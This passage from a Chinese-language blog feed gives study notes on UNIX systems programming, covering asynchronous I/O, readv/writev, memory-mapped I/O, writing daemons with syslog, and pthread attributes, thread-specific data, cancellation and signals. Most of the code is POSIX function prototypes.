*aiocb)</span>;</span><br></pre></td></tr></table></figure><p>获取异步操作的返回值，如果上面的aio_error返回0时，可以调用该函数查看异步操作的返回值。函数返回-1表示出错，会设置errno；其余情况为异步操作的结果。</p><p><strong>注意：</strong></p><p>异步操作完成前不要调用该函数，并且对每个异步操作<strong>仅调用一次</strong>该函数。因为调用该函数后，操作系统就可以释放掉包含了I/O操作返回值的信息。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aio_suspend</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> aiocb *<span class="type">const</span> <span class="built_in">list</span>[], <span class="type">int</span> nent,</span></span><br><span class="line"><span class="params">              <span class="type">const</span> <span class="keyword">struct</span> timespec *timeout)</span>;</span><br></pre></td></tr></table></figure><p>阻塞进程等待异步操作完成。</p><p><code>list</code>参数是指向SIO控制块数组的指针，<code>nent</code>为数组的条目数。<code>timeout</code>设置为NULL可以不设时间限制。</p><p>如果被信号中断，则返回-1且errno设置为EINTR；如果超时则返回-1且errno设置为EAGAIN。<strong>任何一个</strong>操作完成都会使该函数返回0。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">aio_cancel</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> aiocb *aiocb)</span>;</span><br></pre></td></tr></table></figure><p>取消异步操作。</p><p><code>fd</code>为未完成操作的文件的文件描述符。<code>aiocb</code>为文件上的某个指定的异步操作，如果设置为NULL，则会取消文件上所有未完成的异步操作。该函数无法保证能够取消正在进程中的操作。</p><p>返回值：</p><ul><li>AIO_ALLDONE：所有操作在取消前就已经完成。</li><li>AIO_CANCELED：所要求的操作已被取消。</li><li>AIO_NOTCANCELED：至少一个请求的操作没有被取消。</li><li>-1：调用失败，错误码在errno中。</li></ul><p>对被取消的操作调用<code>aio_error</code>会返回错误ECANCELED。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">lio_listio</span><span class="params">(<span class="type">int</span> mode, <span class="keyword">struct</span> aiocb *<span class="keyword">restrict</span> <span class="type">const</span> <span class="built_in">list</span>[<span class="keyword">restrict</span>],</span></span><br><span class="line"><span class="params">             <span class="type">int</span> nent, <span class="keyword">struct</span> sigevent *<span class="keyword">restrict</span> sigev)</span>;</span><br></pre></td></tr></table></figure><p>该函数提交一系列由一个AIO控制块列表描述的I/O请求。</p><p><code>mode</code>参数决定该函数是否是异步的。如果被设定为<code>LIO_WAIT</code>，那么函数将在列表中的所有操作完成后返回；如果设定为<code>LIO_NOWAIT</code>，那么函数将在I/O请求入队后返回，并在所有操作结束后，按照<code>sigev</code>的设定被异步地通知（无需通知则设为NULL）。<code>sigev</code>通知不同于AIO控制块本身的通知，它是额外的，且只会在所有操作完成后才会发送。</p><h1>readv和writev</h1><p>这两个函数用于在一次函数调用中读、写多个非连续缓冲区，也称之为散布读和聚集写。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="comment">// Both return: number of bytes read or written, −1 on error</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">readv</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">writev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span></span><br><span class="line">  <span class="type">void</span>  *iov_base; <span class="comment">/* starting address of buffer */</span></span><br><span class="line">  <span class="type">size_t</span> iov_len;  <span class="comment">/* size of buffer */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>writev</code>按照iov[0]、iov[1]直至iov[iovcnt-1]的顺序输出数据，且返回输出的总字节数。</p><p><code>readv</code>则将读入的数据按照上面的顺序依次存入各个缓冲区，返回读到的总字节数。如果遇到文件尾端，则返回0。</p><h1>存储映射I/O</h1><p>该技术将一个磁盘文件映射到存储空间的一个缓冲区上，从缓冲区读写数据就相当于向文件读写数据。可以在不使用read/write函数的情况下执行I/O。</p><h2 id="映射与解除">映射与解除</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: starting address of mapped region if OK, MAP_FAILED on error</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot, <span class="type">int</span> flag, <span class="type">int</span> fd, <span class="type">off_t</span> off )</span>;</span><br></pre></td></tr></table></figure><p><code>addr</code>指定映射存储区的起始地址。设置为0则由系统自动分配。</p><p><code>prot</code>参数指定映射存储区的保护要求，如下表所示：</p><table><thead><tr><th>prot</th><th>说明</th></tr></thead><tbody><tr><td>PROT_READ</td><td>映射区可读</td></tr><tr><td>PROT_WRITE</td><td>映射区可写</td></tr><tr><td>PROT_EXEC</td><td>映射区可执行</td></tr><tr><td>PROT_NONE</td><td>映射区不可访问</td></tr></tbody></table><p>表中前三项可以任意组合（按位或），但是保护要求不能超过文件本身的访问权限。</p><p><code>flag</code>参数指定了映射区的各类属性：</p><ul><li><p>MAP_FIXED：返回值必须等于<code>addr</code>。即要求内核必须将存储区的起始地址设置为<code>addr</code>，如果没有此标志且<code>addr</code>非0，内核仅将<code>addr</code>的值视为一种建议。</p></li><li><p>MAP_SHARED：表示存储操作会修改映射文件，即相当于调用write。</p></li><li><p>MAP_PRIVATE：表示存储操作会创建改映射文件的副本，所有的存储操作不会修改真实文件。</p></li></ul><p><strong>注意：</strong></p><p><code>off</code>和<code>addr</code>的值一般要求是虚拟系统存储页长度的倍数。</p><p>对于一些映射区不是页长整数倍的情况，系统会分配更多的映射区以满足此要求。如文件长为12字节，页长512字节，则系统会提供512字节的映射区。<u>可以修改后面500字节的内容，但是不会作用到原文件上。</u></p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201211165324.png" alt="Example of a memory-mapped file"></p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span>;</span><br></pre></td></tr></table></figure><p>进程终止或者调用<code>munmap</code>都会解除映射区。但是关闭文件描述符并不会解除映射，并且调用<code>munmap</code>也不会使映射区的内容写到磁盘文件上。</p><h2 id="其他">其他</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure><p>该函数可以更改一个现有映射的权限。</p><p>对于通过MAP_SHARED方式进行的映射，所作的修改不会立即写回到文件中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">msync</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure><p>改函数将修改的页冲洗到文件中去。</p><p>如果将<code>flags</code>参数指定为MS_ASYNC，则仅仅是请求一个写入操作；如果指定为MS_SYNC，那么在返回之前会等待写操作完成。这两个选项必选其一。</p><p>另外，还可以指定MS_INVALIDATE，来告诉操作系统丢弃与底层存储器没有同步的页。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apue </tag>
            
            <tag> I/O </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNIX环境高级编程（13-守护进程）</title>
      <link href="/posts/1130609607.html"/>
      <url>/posts/1130609607.html</url>
      
        <content type="html"><![CDATA[<h1>主要特点</h1><ul><li>一般在系统启动时装入，仅在系统关闭时终止。</li><li>大多数守护进程以超级用户特权运行。</li><li>所有的守护进程都没有控制终端，其终端名设置为问号。<ul><li>内核守护进程以无控制终端方式启动。</li><li>用户层守护进程可以通过调用<code>setsid</code>实现。</li></ul></li><li>用户层守护进程的父进程是init进程。</li></ul><span id="more"></span><h1>消息输出</h1><p>前面提到，守护进程是没有控制终端的，显然无法将自己的消息输出到标准输出或标准错误上。而且系统中运行着许多守护进程，因此需要一个集中的守护进程记录设施，即<code>syslog</code>。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201204155454.png" alt=""></p><p>如上图所示，主要有3中产生日志消息的方式：</p><ol><li>内核例程调用log函数</li><li>大多数用户进程调用syslog函数</li><li>将日志消息发送到UDP的514端口</li></ol><p>而syslogd守护进程接收这些日志消息，在其启动前会读取配置文件（/etc/syslog.conf），以决定各类消息的处理方式。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syslog.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">openlog</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ident, <span class="type">int</span> option, <span class="type">int</span> facility)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">syslog</span><span class="params">(<span class="type">int</span> priority, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">closelog</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="comment">// Returns: previous log priority mask value</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">setlogmask</span><span class="params">(<span class="type">int</span> maskpri)</span>;</span><br></pre></td></tr></table></figure><p>注：在没有调用<code>openlog</code>的情况下，先调用了<code>syslog</code>，会自动调用<code>openlog</code>。</p><p><code>ident</code>参数指向的字符串会被加到日志消息中去，因此一般指定为程序名称。</p><p><code>option</code>参数指定各种选项的位屏蔽，选项见图13.3。</p><p><code>facility</code>参数可选值见图13.4。</p><p><code>priority</code>参数包含facility和level（图13.5）的组合，如果参数中没有指定facility，则会使用<code>openlog</code>中指定的facility，如果没有调用<code>openlog</code>，那么会使用默认值<code>LOG_USER</code>。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201204164720.png" alt=""></p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201204164729.png" alt=""></p><h1>编程规则</h1><p>可以按照如下步骤编写一个守护进程。</p><ol><li>调用<code>umask</code>函数将文件模式创建屏蔽字设置为指定值（通常为0）。守护进程可能需要创建一些文件，如果使用继承的屏蔽字，可能文件的权限会不符合预期。</li><li>调用<code>fork</code>后，使父进程<code>exit</code>。这样可以保证子进程不是进程组的组长进程。</li><li>调用<code>setsid</code>创建新会话。这可以保证当前进程没有控制终端，且成为新会话的首进程和新进程组的组长进程。</li><li>将当前工作目录改为根目录或某个指定位置。</li><li>关闭不再需要的文件描述符。可以使用<code>getrlimit</code>函数获取最高文件描述符值，并关闭直到该值的所有描述符。</li><li>某些守护进程将文件描述符0、1和2指向/dev/null，这样任何需要输入输出的库例程都不会产生影响。</li></ol><h2 id="单实例守护进程">单实例守护进程</h2><p>某些守护进程在同一时刻只能运行一个实例程序，这时候可以使用文件和记录锁（下文简称文件锁，详见14章）来实现这个功能。</p><p>守护进程只要创建一个固定名字的文件（一般在/var/run目录中），并在该文件整体上加一把写锁，那么此后其他的守护进程如果想要给该文件加锁就会失败，也就不应该继续运行。在守护进程终止时，锁会被自动删除，简化了复原过程。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apue </tag>
            
            <tag> daemon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNIX环境高级编程（12-线程控制）</title>
      <link href="/posts/4068102677.html"/>
      <url>/posts/4068102677.html</url>
      
        <content type="html"><![CDATA[<p>本章详细介绍了线程属性和同步原语属性。最后讨论基于进程的系统调用如何与线程进行交互。</p><h1>属性</h1><p>可以通过对每个对象关联的不同属性来细调线程和同步对象的行为。管理这些属性的函数大概有以下几类：</p><ul><li>初始化函数，负责给属性设置为默认值</li><li>销毁函数，负责释放初始化函数分配的资源</li><li>获取属性值的函数</li><li>设置属性值的函数</li></ul><span id="more"></span><h2 id="线程属性">线程属性</h2><ul><li><p>初始化和销毁</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_init</span><span class="params">(<span class="type">pthread_attr_t</span> *attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_destroy</span><span class="params">(<span class="type">pthread_attr_t</span> *attr)</span>;</span><br></pre></td></tr></table></figure><p><code>destroy</code>函数除了释放资源外，还会用无效的值初始化属性对象，这样当线程创建函数误用该对象时，会返回错误信息。</p></li><li><p>分离状态属性<code>detachstate</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_getdetachstate</span><span class="params">(<span class="type">const</span> <span class="type">pthread_attr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                              <span class="type">int</span> *detachstate)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_setdetachstate</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">int</span> detachstate)</span>;</span><br></pre></td></tr></table></figure><p>该状态可以设置成<code>PTHREAD_CREATE_DETACHED</code>或<code>PTHREAD_CREATE_JOINABLE</code>，分别表示以分离状态或正常方式启动线程。</p></li><li><p>线程栈的相关属性</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_getstack</span><span class="params">(<span class="type">const</span> <span class="type">pthread_attr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                  <span class="type">void</span> **<span class="keyword">restrict</span> stackaddr,<span class="type">size_t</span> *<span class="keyword">restrict</span> stacksize)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_setstack</span><span class="params">(<span class="type">pthread_attr_t</span> *attr,</span></span><br><span class="line"><span class="params">                  <span class="type">void</span> *stackaddr, <span class="type">size_t</span> stacksize)</span>;</span><br></pre></td></tr></table></figure><p><code>stackaddr</code>参数指定的是栈的最低内存地址。</p><p>如果不想手动设定栈地址，可以通过下面的函数来仅指定栈大小。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_getstacksize</span><span class="params">(<span class="type">const</span> <span class="type">pthread_attr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                         <span class="type">size_t</span> *<span class="keyword">restrict</span> stacksize)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_setstacksize</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">size_t</span> stacksize)</span>;</span><br></pre></td></tr></table></figure><p><code>guardsize</code>控制线程栈末尾之后用以避免栈溢出的扩展内存的大小。当此值设置为0或者修改了线程属性<code>stackaddr</code>后，系统不会提供警戒缓冲区。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_getguardsize</span><span class="params">(<span class="type">const</span> <span class="type">pthread_attr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                         <span class="type">size_t</span> *<span class="keyword">restrict</span> guardsize)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_setguardsize</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">size_t</span> guardsize)</span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="同步属性">同步属性</h2><h3 id="互斥量属性">互斥量属性</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutexattr_init</span><span class="params">(<span class="type">pthread_mutexattr_t</span> *attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutexattr_destroy</span><span class="params">(<span class="type">pthread_mutexattr_t</span> *attr)</span>;</span><br></pre></td></tr></table></figure><ul><li><p>进程共享属性（process-shared）</p><p>默认情况下，仅相同进程的线程可以访问同一个同步对象（<code>PTHREAD_PROCESS_PRIVATE</code>），但是在某些情况下，需要多个进程访问同一个同步对象，这时候可以将属性设置为<code>THREAD_PROCESS_SHARED</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutexattr_getpshared</span><span class="params">(<span class="type">const</span> <span class="type">pthread_mutexattr_t</span> *</span></span><br><span class="line"><span class="params">                           <span class="keyword">restrict</span> attr, <span class="type">int</span> *<span class="keyword">restrict</span> pshared)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutexattr_setpshared</span><span class="params">(<span class="type">pthread_mutexattr_t</span> *attr,<span class="type">int</span> pshared)</span>;</span><br></pre></td></tr></table></figure></li><li><p>健壮属性（robust）</p><p>当某个线程在终止时没有释放持有的锁，那么当其他线程尝试获取该锁时，会发生问题。如果使用默认的设置（<code>PTHREAD_MUTEX_STALLED</code>），则请求的线程会一直阻塞。可以通过设置为<code>PTHREAD_MUTEX_ROBUST</code>解决这个问题，此时lock函数的返回值为<code>EOWNERDEAD</code>。</p><p>如果线程加锁时发现返回值为<code>EOWNERDEAD</code>，那么在解锁前需要调用consistent函数，声明互斥量的一致性（与该互斥量相关的状态在互斥量解锁之前是一致的）。如果没有调用consistent函数就解锁，那么互斥量将不再可用，其他线程调用lock函数会返回<code>ENOTRECOVERABLE</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutexattr_getrobust</span><span class="params">(<span class="type">const</span> <span class="type">pthread_mutexattr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                              <span class="type">int</span> *<span class="keyword">restrict</span> robust)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutexattr_setrobust</span><span class="params">(<span class="type">pthread_mutexattr_t</span> *attr, <span class="type">int</span> robust)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_consistent</span><span class="params">(<span class="type">pthread_mutex_t</span> * mutex)</span>;</span><br></pre></td></tr></table></figure></li><li><p>类型属性（type）</p><p>控制互斥量的锁定特性。</p><ul><li>PTHREAD_MUTEX_NORMAL         ：标准互斥量，不进行错误检查或死锁检测。</li><li>PTHREAD_MUTEX_ERRORCHECK ：提供错误检查</li><li>PTHREAD_MUTEX_RECURSIVE     ：允许同一线程在解锁前多次加锁。</li><li>PTHREAD_MUTEX_DEFAULT         ：提供默认的特性和行为，操作系统可以将其映射为其他类型。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutexattr_gettype</span><span class="params">(<span class="type">const</span> <span class="type">pthread_mutexattr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                            <span class="type">int</span> *<span class="keyword">restrict</span> type)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutexattr_settype</span><span class="params">(<span class="type">pthread_mutexattr_t</span> *attr, <span class="type">int</span> type)</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>Mutex type</th><th>Relock without unlock?</th><th>Unlock when not owned?</th><th>Unlock when unlocked?</th></tr></thead><tbody><tr><td>PTHREAD_MUTEX_NORMAL</td><td>deadlock</td><td>undefined</td><td>undefined</td></tr><tr><td>PTHREAD_MUTEX_ERRORCHECK</td><td>returns error</td><td>returns error</td><td>returns error</td></tr><tr><td>PTHREAD_MUTEX_RECURSIVE</td><td>allowed</td><td>returns error</td><td>returns error</td></tr><tr><td>PTHREAD_MUTEX_DEFAULT</td><td>undefined</td><td>undefined</td><td>undefined</td></tr></tbody></table></li></ul><h3 id="读写锁属性">读写锁属性</h3><p>读写锁仅支持进程共享属性。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlockattr_init</span><span class="params">(<span class="type">pthread_rwlockattr_t</span> *attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlockattr_destroy</span><span class="params">(<span class="type">pthread_rwlockattr_t</span> *attr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlockattr_getpshared</span><span class="params">(<span class="type">const</span> <span class="type">pthread_rwlockattr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                                <span class="type">int</span> *<span class="keyword">restrict</span> pshared)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlockattr_setpshared</span><span class="params">(<span class="type">pthread_rwlockattr_t</span> *attr,</span></span><br><span class="line"><span class="params">                                <span class="type">int</span> pshared)</span>;</span><br></pre></td></tr></table></figure><h3 id="条件变量属性">条件变量属性</h3><p>支持进程共享属性和<strong>时钟属性</strong>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_condattr_init</span><span class="params">(<span class="type">pthread_condattr_t</span> *attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_condattr_destroy</span><span class="params">(<span class="type">pthread_condattr_t</span> *attr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_condattr_getpshared</span><span class="params">(<span class="type">const</span> <span class="type">pthread_condattr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                              <span class="type">int</span> *<span class="keyword">restrict</span> pshared)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_condattr_setpshared</span><span class="params">(<span class="type">pthread_condattr_t</span> *attr, <span class="type">int</span> pshared)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_condattr_getclock</span><span class="params">(<span class="type">const</span> <span class="type">pthread_condattr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                            <span class="type">clockid_t</span> *<span class="keyword">restrict</span> clock_id)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_condattr_setclock</span><span class="params">(<span class="type">pthread_condattr_t</span> *attr,</span></span><br><span class="line"><span class="params">                            <span class="type">clockid_t</span> clock_id)</span>;</span><br></pre></td></tr></table></figure><p>时钟属性用于控制<code>pthread_cond_timedwait</code>函数使用哪个系统时钟。</p><h3 id="屏障属性">屏障属性</h3><p>只有进程共享属性。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_barrierattr_init</span><span class="params">(<span class="type">pthread_barrierattr_t</span> *attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_barrierattr_destroy</span><span class="params">(<span class="type">pthread_barrierattr_t</span> *attr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_barrierattr_getpshared</span><span class="params">(<span class="type">const</span> <span class="type">pthread_barrierattr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                                 <span class="type">int</span> *<span class="keyword">restrict</span> pshared)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_barrierattr_setpshared</span><span class="params">(<span class="type">pthread_barrierattr_t</span> *attr, <span class="type">int</span> pshared)</span>;</span><br></pre></td></tr></table></figure><h1>线程特定数据</h1><p>线程模型促进了进程中数据和属性的共享，但是在部分场景下，我们又希望线程的部分数据可以是私有的。</p><p>一个进程中的所有线程都可以访问进程的整个地址空间，因此线程没有办法阻止另一个线程访问它的数据（除非使用寄存器），即使是接下来介绍的线程特定数据（thread-specific data）机制，也不能做到这一点。但是通过这种机制，可以提高线程间的独立性，使得线程不太容易访问到其他线程的线程特定数据。</p><p>每个线程通过**键（key）**来访问线程特定数据，键在进程中被所有线程使用，每个线程把自己的线程特定数据和键关联起来。这样，通过同一个键，每个线程可以管理与自己关联的数据。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_key_create</span><span class="params">(<span class="type">pthread_key_t</span> *keyp, <span class="type">void</span> (*destructor)(<span class="type">void</span> *))</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_key_delete</span><span class="params">(<span class="type">pthread_key_t</span> key)</span>;</span><br></pre></td></tr></table></figure><p>创建新键时，每个线程的数据地址为空。同时，在创建的时候可以指定一个析构函数，当线程退出时，如果数据地址不为空，则会调用这个析构函数（参数是数据地址）。</p><p>所有的线程都可以调用删除函数来取消键与数据之间的关联，但是这<strong>不会触发析构函数</strong>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: thread-specific data value or NULL if no value has been associated with the key</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">pthread_getspecific</span><span class="params">(<span class="type">pthread_key_t</span> key)</span>;</span><br><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_setspecific</span><span class="params">(<span class="type">pthread_key_t</span> key, <span class="type">const</span> <span class="type">void</span> *value)</span>;</span><br></pre></td></tr></table></figure><p>我们可以通过get函数的返回值来确定是否需要调用set函数。</p><h1>取消选项</h1><p>有2个额外的线程属性并没有包含在上述的<code>pthread_attr_t</code>中，它们分别是<strong>可取消状态</strong>和<strong>可取消类型</strong>。</p><h2 id="可取消状态">可取消状态</h2><p>该属性可以设置成<code>PTHREAD_CANCEL_ENABLE</code>或<code>PTHREAD_CANCEL_DISABLE</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_setcancelstate</span><span class="params">(<span class="type">int</span> state, <span class="type">int</span> *oldstate)</span>;</span><br></pre></td></tr></table></figure><p>set函数把当前的可取消状态设置为<code>state</code>，同时将原来的状态通过<code>oldstate</code>返回。</p><p>11章在介绍<code>pthread_cancle</code>函数时，我们说到该函数仅仅是提出一个请求，而不保证线程被马上终止。在默认的情况下（即<code>PTHREAD_CANCEL_ENABLE</code>），线程在取消请求发出后，在到达某个取消点时前，都会一直运行。</p><p>在线程调用某些函数时（函数列表见ch12/Cancellation points-x.png），取消点就会出现。但是对于部分特殊的线程，可能很长一段时间都不会调用到这些函数，那么可以使用<code>pthread_testcancel</code>函数手动添加取消点。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pthread_testcancel</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>如果将状态设置为<code>PTHREAD_CANCEL_DISABLE</code>，那么调用<code>pthread_cancle</code>函数并不会杀死线程，取消请求会一直处于挂起状态，直到状态被设置为ENABLE。同理，此时调用<code>pthread_testcancel</code>没有任何效果。</p><h2 id="可取消类型">可取消类型</h2><p>该属性可以设置成<code>PTHREAD_CANCEL_DEFERRED</code>或<code>PTHREAD_CANCEL_ASYNCHRONOUS</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_setcanceltype</span><span class="params">(<span class="type">int</span> type, <span class="type">int</span> *oldtype)</span>;</span><br></pre></td></tr></table></figure><p>默认设置为<code>PTHREAD_CANCEL_DEFERRED</code>，即推迟取消，线程到达取消点之前不会被真正取消。如果设置为<code>PTHREAD_CANCEL_ASYNCHRONOUS</code>，即异步取消，那么线程可以在任意时间撤销，而不必等待到达取消点。</p><h1>信号</h1><p>每个线程有自己的信号屏蔽字，通过<code>pthread_sigmask</code>函数进行设置，参数与<code>sigprocmask</code>类似。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_sigmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *<span class="keyword">restrict</span> <span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">                   <span class="type">sigset_t</span> *<span class="keyword">restrict</span> 